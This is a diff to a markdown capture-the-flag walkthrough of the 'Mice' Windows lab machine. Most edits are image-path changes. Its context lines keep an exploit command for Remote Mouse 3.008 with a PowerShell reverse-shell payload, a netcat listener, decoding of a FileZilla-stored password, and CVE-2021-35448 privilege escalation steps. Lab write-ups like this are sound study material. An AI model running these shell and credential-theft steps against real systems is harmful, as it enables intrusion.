@@ -3,7 +3,8 @@ title: Mice  PGP walkthrough
 description: Target - Mice, OS - Windows
 date: 2025-12-12
 readTime: 10 min read
-image: /assets/images/mice/rdesk.png
+image: "../assets/images/mice/rdesk.png"
+
 ---
 
 # Enum
@@ -75,7 +76,7 @@ python3 RemoteMouse-3.008-Exploit.py -t 192.168.118.199 --v --cmd 'powershell -c
 ```
 
 
-![](/assets/images/mice/exp.png)
+![exp](/1dragon/assets/images/mice/exp.png)
 
 At local 
 
@@ -85,12 +86,12 @@ rlwrap nc -lnvp 80
 
 After the exploit executed reverse shell has be connected successfully.
 
-![](/assets/images/mice/shell-divine.png)
+![](/1dragon/assets/images/mice/shell-divine.png)
  
 
 Got the local.txt under C:\Users\Divine\Desktop
 
-![](/assets/images/mice/local.png)
+![](/1dragon/assets/images/mice/local.png)
 
 ---
  # Privilege Escalation
@@ -102,14 +103,14 @@ A web search about FileZilla credential location showed where it stores user pas
 
 Based on that search information while analyzing internal directories, files found a file named as recentserver.xml which contained a base64 encoded password under `C:\Users\divine\Appdata\Roaming\FileZilla>`
 
-![](/assets/images/mice/filzilla.png)
+![](/1dragon/assets/images/mice/filzilla.png)
 
 Further decoder the hash with base64 -d and found the password
-![](/assets/images/mice/hashed.png)
+![](/1dragon/assets/images/mice/hashed.png)
 
-Further logged into the system via rdesktop as user divine
+Fu.rther logged into the system via rdesktop as user divine
 
-![](/assets/images/mice/rdesk.png)
+![](/1dragon/assets/images/mice/rdesk.png)
 
 
 Searched for exploit in searchsploit DB and mirrored the exploit. That is CVE-2021-35448.
@@ -135,12 +136,12 @@ Steps to reproduce:
 
 Followed those steps in Remote Mouse GUI and cmd prompted as administrator.
 
-![](/assets/images/mice/gui.png)
+![](/1dragon/assets/images/mice/gui.png)
 
 `whoami` showed the user as NT Authority\System
 Finally proof.txt was captured successfully under `C:\Users\Administrator\Desktop`
 
-![NT](/assets/images/mice/nt.png)
+![NT](/1dragon/assets/images/mice/nt.png)
 
 ---
 
